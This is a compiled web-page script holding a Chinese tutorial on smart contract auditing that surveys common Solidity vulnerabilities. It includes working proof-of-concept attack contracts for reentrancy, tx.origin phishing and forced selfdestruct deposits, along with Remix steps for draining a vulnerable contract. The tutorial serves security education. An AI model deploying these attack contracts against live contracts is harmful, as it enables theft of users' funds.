import{_ as p}from"./_plugin-vue_export-helper.cdc0426e.js";import{o,c,a as n,b as s,d as t,e,r as i}from"./app.7b6c8628.js";const l={},u=e('<h1 id="智能合约审计" tabindex="-1"><a class="header-anchor" href="#智能合约审计" aria-hidden="true">#</a> 智能合约审计</h1><h2 id="常见漏洞" tabindex="-1"><a class="header-anchor" href="#常见漏洞" aria-hidden="true">#</a> 常见漏洞</h2><p>以下总结的常见漏洞基本涵盖一般的漏洞类型，部分内容可能过于细致，或许有更加合理的分类方法。不过，应该能给大家提供一定的参考。</p><h3 id="整数溢出" tabindex="-1"><a class="header-anchor" href="#整数溢出" aria-hidden="true">#</a> 整数溢出</h3><p>注意，Solidity 0.8.0 开始，加入了自动检查溢出，此版本之后的合约，可不必担心这个漏洞。</p>',5),r={href:"https://etherscan.io/address/0xC5d105E63711398aF9bbff092d4B6769c82f793d#code",target:"_blank",rel:"noopener noreferrer"},d=e(`<p>从区块链浏览器将代码复制到 remix IDE，仔细看第 259行的 <code>batchTransfer</code> 函数，它用于给地址列表中的所有地址都转账 <code>_value</code>：</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>  <span class="token keyword">function</span> <span class="token function">batchTransfer</span><span class="token punctuation">(</span><span class="token parameter">address<span class="token punctuation">[</span><span class="token punctuation">]</span> _receivers<span class="token punctuation">,</span> uint256 _value</span><span class="token punctuation">)</span> <span class="token keyword">public</span> whenNotPaused <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    uint cnt <span class="token operator">=</span> _receivers<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
    uint256 amount <span class="token operator">=</span> <span class="token function">uint256</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span> <span class="token operator">*</span> _value<span class="token punctuation">;</span>
    <span class="token function">require</span><span class="token punctuation">(</span>cnt <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> cnt <span class="token operator">&lt;=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">require</span><span class="token punctuation">(</span>_value <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>

    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>uint i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cnt<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        balances<span class="token punctuation">[</span>_receivers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>_receivers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">Transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> _receivers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> _value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>但是没有检查 <code>amount</code> 是否溢出，这导致每个人的转账金额 <code>_value</code> 很大，但是总共的 <code>amount</code> 却接近0.</p><h3 id="重入攻击" tabindex="-1"><a class="header-anchor" href="#重入攻击" aria-hidden="true">#</a> 重入攻击</h3>`,4),k=n("code",null,"withdraw",-1),v=n("code",null,"withdraw",-1),b=n("code",null,"withdraw",-1),m={href:"https://solidity-by-example.org/hacks/re-entrancy/",target:"_blank",rel:"noopener noreferrer"},h={href:"https://learnblockchain.cn/article/3512#receive-%E5%87%BD%E6%95%B0",target:"_blank",rel:"noopener noreferrer"},g=e(`<div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
pragma solidity <span class="token operator">^</span><span class="token number">0.8</span><span class="token number">.10</span><span class="token punctuation">;</span>

contract EtherStore <span class="token punctuation">{</span>
    <span class="token function">mapping</span><span class="token punctuation">(</span><span class="token parameter">address</span> <span class="token operator">=&gt;</span> uint<span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token punctuation">{</span>
        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        uint bal <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span>bal <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">(</span>bool sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span><span class="token literal-property property">value</span><span class="token operator">:</span> bal<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">&quot;Failed to send Ether&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Helper function to check the balance of this contract</span>
    <span class="token keyword">function</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> view <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

contract Attack <span class="token punctuation">{</span>
    EtherStore <span class="token keyword">public</span> etherStore<span class="token punctuation">;</span>

    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">address _etherStoreAddress</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        etherStore <span class="token operator">=</span> <span class="token function">EtherStore</span><span class="token punctuation">(</span>_etherStoreAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Fallback is called when EtherStore sends Ether to this contract.</span>
    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>etherStore<span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">&gt;=</span> <span class="token number">1</span> ether<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            etherStore<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&gt;=</span> <span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
        etherStore<span class="token punctuation">.</span>deposit<span class="token punctuation">{</span><span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token number">1</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        etherStore<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Helper function to check the balance of this contract</span>
    <span class="token keyword">function</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> view <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol><li>先部署 EtherStore，然后分别用不同的账户 调用 <code>deposit</code> 函数，单位选择 ether，value 为 1.</li></ol><p><img src="http://blog-blockchain.xyz/202203260120919.png" alt="image-20220201151421686" loading="lazy"></p><p><img src="http://blog-blockchain.xyz/202203260121816.png" alt="image-20220201151807345" loading="lazy"></p><ol start="2"><li>复制 EtherStore 合约地址，作为构造函数参数，选择 Attack 合约，部署(注意去除部署时地址的双引号)!</li></ol><p><img src="http://blog-blockchain.xyz/202203260121425.png" alt="image-20220201152451682" loading="lazy"></p><ol start="3"><li>选择新的账户，同样单位选择 ether，value 为 1，调用 <code>attack </code>函数，可见 <code>Attackt</code> 合约的账户余额增加，<code>EtherStore</code> 的账户余额归零。</li></ol>`,7),y={href:"https://etherscan.io/address/0xbb9bc244d798123fde783fcc1c72d3bb8c189413#code",target:"_blank",rel:"noopener noreferrer"},f=n("code",null,"splitDAO",-1),w=e(`<h3 id="payable-函数导致合约余额更新" tabindex="-1"><a class="header-anchor" href="#payable-函数导致合约余额更新" aria-hidden="true">#</a> payable 函数导致合约余额更新</h3><p>因为当执行函数之前，合约首先是读取交易对象，因此合约的余额会先改变成 原来的余额+msg.value，某些合约可能会未注意合约余额已发生改变，导致漏洞。</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>

<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">payableFunc</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> Owner<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        Owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> Owner<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">payable</span><span class="token punctuation">(</span>Owner<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">multiplicate</span><span class="token punctuation">(</span><span class="token builtin">address</span> adr<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&gt;=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">payable</span><span class="token punctuation">(</span>adr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">+</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里的 <code>multiplicate</code> 函数 <code>msg.value &gt;= address(this).balance</code> 永远不可能为真。</p><h3 id="tx-origin" tabindex="-1"><a class="header-anchor" href="#tx-origin" aria-hidden="true">#</a> tx.origin</h3><p>用交易的发起者作为判断条件，可能会被精心设计的回退函数利用，转而调用其他的合约，<code>tx.origin</code> 仍然是最初的交易发起者，但是执行人却已经改变了。</p><p>如下面 <code>phish</code> 合约中的 <code>withdrawAll</code> 函数的要求的是 <code>tx.origin = owner</code>，那么如果是 <code>owner</code> 向 <code>TxOrigin</code> 合约发送以太币，就会触发 <code>fallback</code> 函数，在 <code>attack</code> 函数中调用 <code>withdrawAll</code> 函数，窃取以太币。</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>
<span class="token keyword">contract</span> <span class="token class-name">phish</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
    <span class="token keyword">constructor</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">function</span> withdrawAll <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _recipient<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>
        _recipient<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">getOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> owner<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">TxOrigin</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span>  owner<span class="token punctuation">;</span>
    phish PH<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> phishAddr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        PH<span class="token operator">=</span><span class="token function">phish</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span>phishAddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> phOwner <span class="token operator">=</span> PH<span class="token punctuation">.</span><span class="token function">getOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>phOwner <span class="token operator">==</span> msg<span class="token punctuation">.</span> sender<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            PH<span class="token punctuation">.</span><span class="token function">withdrawAll</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">payable</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span> balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">{</span>
        <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="短地址攻击" tabindex="-1"><a class="header-anchor" href="#短地址攻击" aria-hidden="true">#</a> 短地址攻击</h3>`,9),_=n("code",null,"data",-1),x={href:"https://zhuanlan.zhihu.com/p/459969916",target:"_blank",rel:"noopener noreferrer"},q=n("strong",null,"应用二进制接口(ABI)",-1),S=e(`<h3 id="挖矿属性依赖" tabindex="-1"><a class="header-anchor" href="#挖矿属性依赖" aria-hidden="true">#</a> 挖矿属性依赖</h3><p>合约中有部分内置变量，这些变量会受到矿工的影响，因此不应该把它们当作特定的判断条件。</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>

<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>
<span class="token keyword">contract</span> <span class="token class-name">Roulette</span> <span class="token punctuation">{</span>
    <span class="token builtin">uint</span> <span class="token keyword">public</span> pastBlockTime<span class="token punctuation">;</span>
    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token number">10</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp <span class="token operator">!=</span> pastBlockTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pastBlockTime <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp <span class="token operator">%</span> <span class="token number">15</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//依赖了区块时间戳</span>
        <span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>   
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="合约余额依赖" tabindex="-1"><a class="header-anchor" href="#合约余额依赖" aria-hidden="true">#</a> 合约余额依赖</h3><p><code>selfdestruct</code> 函数是内置的强制执行的函数，因此即使合约并没有可接受以太币的方法，其他人也可以强制通过 <code>selfdestruct</code> 函数改变合约的余额。因此，需要仔细检查是否把合约余额当作判断标准。</p><p>例如下面的合约，规定只有恰好为 7 ether 才能胜出，但是攻击者可以通过 <code>selfdestruct</code> 函数让没有人能够达到 7 ether.</p><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.10</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">EtherGame</span> <span class="token punctuation">{</span>
    <span class="token builtin">uint</span> <span class="token keyword">public</span> targetAmount <span class="token operator">=</span> <span class="token number">7</span> ether<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> winner<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token number">1</span> ether<span class="token punctuation">,</span> <span class="token string">&quot;You can only send 1 Ether&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">uint</span> balance <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>balance <span class="token operator">&lt;=</span> targetAmount<span class="token punctuation">,</span> <span class="token string">&quot;Game is over&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//只有合约余额达到 7 ether 才能成功</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>balance <span class="token operator">==</span> targetAmount<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            winner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">claimReward</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> winner<span class="token punctuation">,</span> <span class="token string">&quot;Not winner&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">&quot;Failed to send Ether&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>
    EtherGame etherGame<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span>EtherGame _etherGame<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        etherGame <span class="token operator">=</span> <span class="token function">EtherGame</span><span class="token punctuation">(</span>_etherGame<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> <span class="token keyword">payable</span> addr <span class="token operator">=</span> <span class="token keyword">payable</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>etherGame<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

